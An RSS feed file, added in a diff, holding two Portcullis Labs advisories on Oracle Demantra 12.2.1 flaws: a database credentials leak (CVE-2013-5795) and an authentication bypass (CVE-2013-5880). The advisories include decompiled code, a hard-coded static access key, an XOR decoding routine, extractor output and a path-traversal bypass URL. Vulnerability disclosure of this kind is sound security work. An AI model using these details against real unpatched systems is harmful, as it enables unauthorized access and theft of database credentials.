@@ -1,0 +1,330 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Portcullis Labs &#187; ORG</title>
+	<atom:link href="https://labs.portcullis.co.uk/author/org/feed/" rel="self" type="application/rss+xml" />
+	<link>https://labs.portcullis.co.uk</link>
+	<description>Research and Development</description>
+	<language>en-US</language>
+		<sy:updatePeriod>hourly</sy:updatePeriod>
+		<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>http://wordpress.org/?v=3.8.5</generator>
+	<item>
+		<title>CVE-2013-5795: Oracle Demantra database credentials leak vulnerability</title>
+		<link>https://labs.portcullis.co.uk/blog/cve-2013-5795-oracle-demantra-database-credentials-leak-vulnerability/</link>
+		<comments>https://labs.portcullis.co.uk/blog/cve-2013-5795-oracle-demantra-database-credentials-leak-vulnerability/#comments</comments>
+		<pubDate>Thu, 20 Feb 2014 06:23:54 +0000</pubDate>
+		<dc:creator><![CDATA[ORG]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[CVE-2013-5795]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[Oracle Demantra]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=3089</guid>
+		<description><![CDATA[<p>The purpose of this post is to present a technical report of the CVE-2013-5795 vulnerability. This bug was found on a bug hunt weekend. Oracle Demantra is a demand management, sales &#38; operations planning, and trade promotions management solutions, which was acquired by Oracle in 2006. It was curious to note no previously vulnerabilities had been identified, which made [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/cve-2013-5795-oracle-demantra-database-credentials-leak-vulnerability/">CVE-2013-5795: Oracle Demantra database credentials leak vulnerability</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>The purpose of this post is to present a technical report of the <a title="CVE-2013-5795" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5795">CVE-2013-5795</a> vulnerability. This bug was found on a bug hunt weekend.<span id="more-3089"></span></p>
+<p>Oracle Demantra is a demand management, sales &amp; operations planning, and trade promotions management solutions, which was acquired by Oracle in 2006. It was curious to note no previously vulnerabilities had been identified, which made this a very interesting candidate for research.</p>
+<h2>Vulnerable System:</h2>
+<ul>
+<li>Oracle Demantra 12.2.1</li>
+</ul>
+<h2>Vulnerability Description:</h2>
+<p>Demantra has a backend function that allows an administrator to retrieve the database instance name and the corresponding credentials.</p>
+<p>The URL endpoint for this functionality is located at:</p>
+<ul>
+<li>/demantra/ServerDetailsServlet</li>
+</ul>
+<p>The initial function looks like this:</p>
+<pre class="brush: java; gutter: false; title: ; notranslate">
+public void doGet(HttpServletRequest iRequest, HttpServletResponse ioResponse) throws ServletException, IOException {
+	PrintWriter outWriter = null;
+	String dbDetails = null;
+	String msg = null;
+	String uak = iRequest.getParameter(&quot;UAK&quot;);
+
+	if(Logger.isDebugEnabled(&quot;appserver.configuration&quot;)) MessagesService.getPlatformMassage(40688, new Object[] { getClass().getName(), (new StringBuilder()).append(&quot;UAK=&quot;).append(uak).toString() });
+
+	if(isValidUAK(uak)) {
+		dbDetails = getDBParams();
+		dbDetails = CryptographicService.encodeString(dbDetails);
+		msg = MessagesService.getPlatformMassage(20176, new Object[] { dbDetails });
+		if(Logger.isDebugEnabled(&quot;appserver.configuration&quot;)) Logger.log(&quot;appserver.configuration&quot;, msg);
+			if(dbDetails != null) {
+				outWriter = new PrintWriter(ioResponse.getOutputStream());
+				outWriter.print(dbDetails);
+				outWriter.flush();
+			outWriter.close();
+		} else {
+			ioResponse.sendError(500, msg);
+		}
+	} else {
+		ioResponse.sendError(403);
+	}
+}
+</pre>
+<p>We can see that a URL parameter named UAK is required. If the UAK string is correct then the database parameters are read and encrypted.</p>
+<p>The getDBParams function looks like this:</p>
+<pre class="brush: java; gutter: false; title: ; notranslate">
+private String getDBParams() {
+	StringBuilder strBuilder = new StringBuilder();
+	String dbName = null;
+	String resStr = null;
+	String msg = null;
+	boolean isValid = true;
+
+	if(JDBCConnectionPool.DBTypeId == 1) dbName = &quot;orc&quot;;
+		else dbName = CommonProp.DB_NAME;
+	if(CommonProp.DB_USER == null || CommonProp.DB_USER.length() == 0) {
+		isValid = false;
+		msg = translator.translate(&quot;com.demantra.applicationServer.servlets.ServerDetailsServlet_1&quot;, new Object[] { DB_USER });
+		Logger.warn(msg);
+	}
+	if(CommonProp.DB_PASSWORD == null || CommonProp.DB_PASSWORD.length() == 0) {
+		isValid = false;
+		msg = translator.translate(&quot;com.demantra.applicationServer.servlets.ServerDetailsServlet_1&quot;, new Object[] { DB_PASSWORD });
+		Logger.warn(msg);
+	}
+	if(CommonProp.TNS_NAME == null || CommonProp.TNS_NAME.length() == 0) {
+		isValid = false;
+		msg = translator.translate(&quot;com.demantra.applicationServer.servlets.ServerDetailsServlet_1&quot;, new Object[] { DB_TNS_NAME });
+		Logger.warn(msg);
+	}
+	if(dbName == null || dbName.length() == 0) {
+		isValid = false;
+		msg = translator.translate(&quot;com.demantra.applicationServer.servlets.ServerDetailsServlet_1&quot;, new Object[] { DB_NAME });
+		Logger.warn(msg);
+	}
+	if(JDBCConnectionPool.DBTypeId &lt; 1 || JDBCConnectionPool.DBTypeId &gt; 2) {
+		isValid = false;
+		msg = translator.translate(&quot;com.demantra.applicationServer.servlets.ServerDetailsServlet_1&quot;, new Object[] { DB_TYPE });
+		Logger.warn(msg);
+	}
+	if(isValid) {
+		strBuilder.append(CommonProp.DB_USER);
+		strBuilder.append(&quot;?&quot;);
+		strBuilder.append(CommonProp.DB_PASSWORD);
+		strBuilder.append(&quot;?&quot;);
+		strBuilder.append(CommonProp.TNS_NAME);
+		strBuilder.append(&quot;?&quot;);
+		strBuilder.append(dbName);
+		strBuilder.append(&quot;?&quot;);
+		strBuilder.append(JDBCConnectionPool.DBTypeId);
+		resStr = strBuilder.toString();
+	}
+	return resStr;
+}
+</pre>
+<p>Now we need to see how UAK is calculated. The necessary function can be found in the following file:</p>
+<ul>
+<li>WEB-INF/classes/com/demantra/applicationServer/metaDataObjects/user/SGEUser.class</li>
+</ul>
+<p>Suprisingly, the UAK key is calculated statically:</p>
+<pre class="brush: java; gutter: false; title: ; notranslate">
+private static String createJavaUAK() {
+	String uak = null;
+
+	try {
+		String encryptedPassword = new String(CryptographicService.encodeHashStringHex(&quot;er6Us8wB&quot;, &quot;SHA-256&quot;));
+		StringBuffer tmp = new StringBuffer(&quot;sge&quot;);
+		tmp.append(0);
+		tmp.append(encryptedPassword);
+		uak = new String(CryptographicService.encodeHashStringHex(tmp.toString(), &quot;SHA-256&quot;));
+	} catch(NoSuchAlgorithmException e) {
+		Logger.error(e);
+	}
+	return uak;
+}
+</pre>
+<p>When calculated, the UAK string will always be:</p>
+<ul>
+<li>406EDC5447A3A43551CDBA06535FB6A661F4DC1E56606915AC4E382D204B8DC1</li>
+</ul>
+<p>The last step is to analyze how the dbDetails parameter encrypts the data, so that we can decrypt it correctly. The function looks like this:</p>
+<pre class="brush: java; title: ; notranslate">
+public static String decodeString(String text) {
+	if(text == null) return null;
+	String ret = null;
+	StringTokenizer strTokenizer = new StringTokenizer(text, &quot;,&quot;);
+	int size = strTokenizer.countTokens();
+	byte bytes[] = new byte[size];
+	for(int counter = 0; strTokenizer.hasMoreTokens(); counter++) {
+		int a = Integer.parseInt(strTokenizer.nextToken());
+		a ^= 0x50;
+		bytes[counter] = (byte)a;
+	}
+	try {
+		ret = new String(bytes, &quot;UTF-8&quot;);
+	} catch(Exception e) {
+		e.printStackTrace();
+	}
+	return ret;
+}
+</pre>
+<p>As we can see the method used to secure the data is a simple XOR algorithm.</p>
+<p>Armed with those information it is possible to create a simple database credentials extractor:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ java getUAK
+
+-=[Oracle Demantra Database Details Retriever ]=-
+
+[+] UAK Key is: 406EDC5447A3A43551CDBA06535FB6A661F4DC1E56606915AC4E382D204B8DC1
+[+] Retrieved the following encrypted string:
+4,21,3,4,111,36,53,35,36,111,52,53,61,49,62,36,34,49,111,63,34,51,111,97,
+[+] Decrypted string is:
+TEST?test?demantra?orc?1
+</pre>
+<p>Together with the <a title="authentication bypass" href="/blog/cve-2013-5880-oracle-demantra-authentication-bypass-vulnerability/">authentication bypass</a> this can be exploited unauthenticated as well.</p>
+<h2>Impact:</h2>
+<p>A remote attacker could exploit this issue in combination with other found issues, to extract the database credentials and instance name as an unauthenticated user, otherwise authentication is required.</p>
+<h2>Recommendation:</h2>
+<p>Please see the Oracle CPU for remediation:</p>
+<ul>
+<li><a title="Oracle CPU January 2014" href="http://www.oracle.com/technetwork/topics/security/cpujan2014-1972949.html">Oracle CPU January 2014</a></li>
+</ul>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/cve-2013-5795-oracle-demantra-database-credentials-leak-vulnerability/">CVE-2013-5795: Oracle Demantra database credentials leak vulnerability</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/cve-2013-5795-oracle-demantra-database-credentials-leak-vulnerability/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>CVE-2013-5880: Oracle Demantra authentication bypass vulnerability</title>
+		<link>https://labs.portcullis.co.uk/blog/cve-2013-5880-oracle-demantra-authentication-bypass-vulnerability/</link>
+		<comments>https://labs.portcullis.co.uk/blog/cve-2013-5880-oracle-demantra-authentication-bypass-vulnerability/#comments</comments>
+		<pubDate>Wed, 19 Feb 2014 06:35:39 +0000</pubDate>
+		<dc:creator><![CDATA[ORG]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[CVE-2013-5880]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[Oracle Demantra]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=3074</guid>
+		<description><![CDATA[<p>The purpose of this post is to present a technical report of the CVE-2013-5880 vulnerability. This bug was found on a bug hunt weekend. Oracle Demantra is a demand management, sales and operations planning, and trade promotions management solutions, which was acquired by Oracle in 2006. It was curious to note no previously vulnerabilities had been identified, which made [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/cve-2013-5880-oracle-demantra-authentication-bypass-vulnerability/">CVE-2013-5880: Oracle Demantra authentication bypass vulnerability</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>The purpose of this post is to present a technical report of the <a title="CVE-2013-5880" href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-5880">CVE-2013-5880</a> vulnerability. This bug was found on a bug hunt weekend.<span id="more-3074"></span></p>
+<p>Oracle Demantra is a demand management, sales and operations planning, and trade promotions management solutions, which was acquired by Oracle in 2006. It was curious to note no previously vulnerabilities had been identified, which made this a very interesting candidate for research.</p>
+<h2>Vulnerable System:</h2>
+<ul>
+<li>Oracle Demantra 12.2.1</li>
+</ul>
+<h2>Vulnerability Description:</h2>
+<p>Demantra uses an Authorization Filter that analyses each request made to the web application. The authorization filter is based on one main file located in the security folder in the root directory. This file is called &#8220;authorizationUnsecureURLs.txt&#8221;.</p>
+<p>There is a vulnerability relating to the way the authorization filter handles input that allows a malicious attacker to bypass authentication.</p>
+<p>The authorizedUnsecureURLs contains a list of all pages that can be accessed without a proper authenticated session. When opened the file looks like this:</p>
+<pre class="brush: plain; gutter: false; title: ; notranslate">
+#This file contains a list of all demantra URLs considered safe for an unauthenticated user.
+#This means that anyone can access these pages, and no security checks whatsoever are done on requests
+#for these pages.
+#WARNING!!! CHANGING ANYTHING IN THIS FILE CAN SERIOUSLY AFFECT PROGRAM USABILITY AND/OR COMPROMISE SECURITY!!!!
+#After altering page, for changes to take effect server must be restarted.
+#Login
+/portal/loginpage.jsp
+/common/loginCheck.jsp
+/portal/partnerLogin.jsp
+/workflow/login.jsp
+/LoginServlet
+/portal/DOLLogin.jsp
+/portal/remoteloginpage.jsp
+/admin/adminManagement.jsp
+/portal/userManagement.jsp
+/portal/adminLogin.jsp
+/portal/anywhereLogin.jsp
+/portal/launchDPWeb.jsp
+/common/changePassword.jsp
+#Error Pages
+/common/ForbiddenErrorPage.jsp
+/portal/notAuthorizedAdmin.jsp
+/workflow/notLoggedIn.jsp
+/portal/notLoggedIn.jsp
+/portal/generalErrorPage.jsp
+/portal/notFoundErrorPage.jsp
+#Engine
+/BatchForecastServlet
+/SimulationServlet
+#BM
+/ServerDetailsServlet
+#DB
+/NotificationServlet
+#Integration
+/common/prelogin.jsp
+/WorkflowServer
+#Other
+/ConnectionServlet
+/portal/checkSessionExpiration.jsp
+</pre>
+<p>The main class is located at :</p>
+<ul>
+<li>WEB-INF/classes/com/demantra/security/server/authorization/AuthorizationFilter.class</li>
+</ul>
+<p>The AuthorizationFilter class loads all the pages in a list and intercepts any request made to the application. The requested URL is then checked through the isSecureURL function which is defined in:</p>
+<ul>
+<li>WEB-INF/classes/com/demantra/security/server/SessionAuthenticationFilter.class</li>
+</ul>
+<p>The function looks like this:</p>
+<pre class="brush: java; gutter: false; title: ; notranslate">
+protected boolean isSecureURL(String url) {
+	boolean isSecure = true;
+	List safeUrls = getSafeUrls();
+
+	if(safeUrls != null) {
+		Iterator i$ = safeUrls.iterator();
+		do {
+			if(!i$.hasNext()) break;
+			String safeUrl = (String)i$.next();
+			if(url.indexOf(safeUrl) != -1) isSecure = false;
+		} while(true);
+
+	}
+	return isSecure;
+}
+</pre>
+<p>Each request is matched against the URL list defined in the authorizationUnsecureURLs.txt file. However, the code has a design flaw that can be exploited.</p>
+<p>Let’s assume we have a URL like this:</p>
+<ul>
+<li>demantra/common/loginCheck.jsp</li>
+</ul>
+<p>This will then be compared with the following code:</p>
+<pre class="brush: java; gutter: false; title: ; notranslate">
+url.indexOf(safeURL)
+</pre>
+<p>safeURL() contains the allowed URL list, which contains</p>
+<ul>
+<li>/common/loginCheck.jsp</li>
+</ul>
+<p>which will allow any user to view that page.</p>
+<p>A malicious attacker can abuse this check due to the insecure usage of indexOf(). Let’s see what the definition of indexOf() says:</p>
+<pre class="brush: java; gutter: false; title: ; notranslate">
+int indexOf(String str)
+</pre>
+<p>This returns the index within this string of the first occurrence of the specified substring. If it does not occur as a substring, -1 is returned.<br />
+As we can see it only check if there is an occurrence of the string, it does not actually check the full URL, which allows an attacker to do things that shouldn’t be possible to do.</p>
+<p>Let’s assume an attacker wants to access:</p>
+<ul>
+<li>/demantra/portal/editExecDefinition.jsp?menuBarId=2&amp;menuGroupId=5&amp;menuGroupName=Applications&amp;tkn=-308184887676887</li>
+</ul>
+<p>This request would fail as the user would need to be authenticated to access the above URL.</p>
+<p>However, if the URL is constructed like:</p>
+<ul>
+<li>/demantra/common/loginCheck.jsp/../../portal/portal/editExecDefinition.jsp?menuBarId=2&amp;menuGroupId=5&amp;menuGroupName=Applications&amp;tkn=-308184887676887</li>
+</ul>
+<p>This would be a valid request as the isSecureURL() would return true due to the fact that /common/loginCheck.jsp exists and is a valid URL to be accessed unauthenticated.</p>
+<h2>Impact:</h2>
+<p>A remote, unauthenticated attacker could exploit this issue in combination with other found issues, to extract data from the database or retrieve files from the system. In some cases this could also lead to arbitrary code execution</p>
+<h2>Recommendation:</h2>
+<p>Please see the Oracle CPU for remediation:</p>
+<ul>
+<li><a title="Oracle CPU January 2014" href="http://www.oracle.com/technetwork/topics/security/cpujan2014-1972949.html">Oracle CPU January 2014</a></li>
+</ul>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/cve-2013-5880-oracle-demantra-authentication-bypass-vulnerability/">CVE-2013-5880: Oracle Demantra authentication bypass vulnerability</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/cve-2013-5880-oracle-demantra-authentication-bypass-vulnerability/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+	</channel>
+</rss>
